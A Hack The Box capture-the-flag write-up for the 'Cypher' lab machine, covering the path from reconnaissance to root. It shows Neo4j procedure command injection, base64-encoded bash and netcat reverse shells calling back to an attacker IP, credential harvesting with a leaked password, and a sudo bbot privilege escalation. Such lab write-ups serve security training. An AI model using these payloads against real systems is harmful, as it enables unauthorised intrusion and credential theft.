<div align=center>

# Cypher Machine Write-up

[HTB Machine Certificate](https://labs.hackthebox.com/achievement/machine/2088593/650)
</div>


### **Initial Reconnaissance**
Started with an `nmap` scan to identify open ports and services:  
```bash
ports=$(nmap -p- --min-rate=1000 -T4 <IP> | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV <IP>
```

**Results:**  
```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

### **Web Enumeration**
- Accessed `http://cypher.htb` → Found a login page.  
- Attempted SQLi (unsuccessful).  
- Ran `ffuf` to discover directories:  
  ```bash
  ffuf -w /path/to/wordlist:FUZZ -u http://cypher.htb/FUZZ
  ```

**Key Findings:**  
1. **`/testing`**: Hosted a `.jar` file.  
   - Decompiled it with `cfr`:  
     ```bash
     wget https://www.benf.org/other/cfr/cfr-0.152.jar -O cfr.jar
     java -jar cfr.jar HelloWorldProcedure.class
     ```
   - **Analysis**: Revealed a custom Neo4j procedure (`custom.getUrlStatusCode`) executing OS commands via `Runtime.getRuntime().exec()` → **RCE vector**.  

2. **`/api`**: Discovered endpoint `/api/cypher` requiring a `query` parameter.  
   ```json
   {"detail":[{"type":"missing","loc":["query","query"],"msg":"Field required","input":null}]}
   ```

---

### **Exploiting RCE**
1. Hosted a Python web server:  
   ```bash
   python3 -m http.server 8000
   ```
2. Sent payload to confirm RCE:  
   ```bash
   curl 'http://cypher.htb/api/cypher?query=CALL%20custom.getUrlStatusCode(%22http://10.10.14.170:8000%22)'
   ```
   - **Result**: Server connected back → **RCE confirmed**.

**Command Injection via Parameter:**  
- Exploited command injection in the URL parameter:  
  ```bash
  curl 'http://cypher.htb/api/cypher?query=CALL%20custom.getUrlStatusCode(%22http://127.0.0.1%22%60id%60)'
  ```
  **Output**:  
  ```
  [{"statusCode":"302uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)"}]
  ```

---

### **Reverse Shell**
1. **Attempt 1 (Bash):**  
   - Payload:  
     ```bash
     CALL custom.getUrlStatusCode("http://127.0.0.1/;bash -i >& /dev/tcp/10.10.14.170/443 0>&1")
     ```
   - **Encoded**:  
     ```
     CALL%20custom.getUrlStatusCode%28%27http%3A%2F%2F127.0.0.1%7Cecho%2BYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNzAvNDQzIDA%2BJjEK%0A%2B%7C%2Bbase64%2B-d%2B%7C%2Bbash%27%29
     ```
   - **Issue**: Shell exited immediately.  

2. **Attempt 2 (Netcat):**  
   - Payload:  
     ```bash
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.170 443 >/tmp/f
     ```
   - **Encoded**:  
     ```
     CALL%20custom.getUrlStatusCode%28%27http%3A%2F%2F127.0.0.1%2F%7Cecho%20cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2BJjF8bmMgMTAuMTAuMTQuMTcwIDQ0MyA%2BL3RtcC9mCg%3D%3D%7Cbase64%20-d%7Cbash%27%29%0A
     ```
   - **Success**: Stable shell as `neo4j@cypher`.

---

### **Post-Exploitation Enumeration**
- Ran `LinEnum.sh` → Found Neo4j password:  
  ```bash
  grep -Ri "password\|credential\|secret" /etc/neo4j /var/lib/neo4j
  ```
  **Output**:  
  ```
  /var/lib/neo4j/.bash_history:neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
  ```

- Verified Neo4j port with `ss -tulnp`:  
  ```
  tcp   LISTEN 0      4096      172.18.0.1:7687      0.0.0.0:*    users:(("java",pid=1821,fd=358))
  ```

- Connected to Neo4j:  
  ```bash
  cypher-shell -a bolt://172.18.0.1:7687 -u neo4j -p 'cU4btyib.20xtCMCXkBmerhK'
  ```

---

### **Database Exploration**
- **Queries**:  
  ```cypher
  CALL db.labels();       // Show node types
  MATCH (u:USER) RETURN u LIMIT 10;
  MATCH (s:SHA1) RETURN s LIMIT 10;
  SHOW USERS;
  ```
  **Findings**:  
  - Single SHA1 hash: `9f54ca4c130be6d529a56dee59dc2b2090e43acf` (couldn't crack).  
  - Single OS user: `graphasm`.  

---

### **Privilege Escalation to `graphasm`**
- Used the discovered password for SSH:  
  ```bash
  ssh graphasm@cypher.htb
  ```
  **Success**: Logged in as `graphasm`.  

- Found in home directory:  
  ```bash
  ls -la
  ```
  ```
  -rw-r--r-- 1 graphasm graphasm  142 Jun 12 16:32 bbot_preset.yml
  -r-------- 1 graphasm graphasm   33 Jun 12 16:33 user.txt
  ```

- Checked `sudo` privileges:  
  ```bash
  sudo -l
  ```
  ```
  User graphasm may run the following commands on cypher:
      (ALL) NOPASSWD: /usr/local/bin/bbot
  ```

---

### **Privilege Escalation to `root`**
- Edited `bbot_preset.yml` to include:  
  ```yaml
  module_dirs: /home/graphasm
  ```
  - Added a malicious Python module (from [Smavl/bbot-shell](https://github.com/Smavl/bbot-shell)).  

- Executed `bbot` to spawn root shell:  
  ```bash
  sudo /usr/local/bin/bbot -m shell -p /home/graphasm/bbot_preset.yml
  ```
  **Result**:  
  ```
  [SUCC] shell: Spawning shell: /usr/bin/bash as root
  ```

- **Root Achieved**!  

---

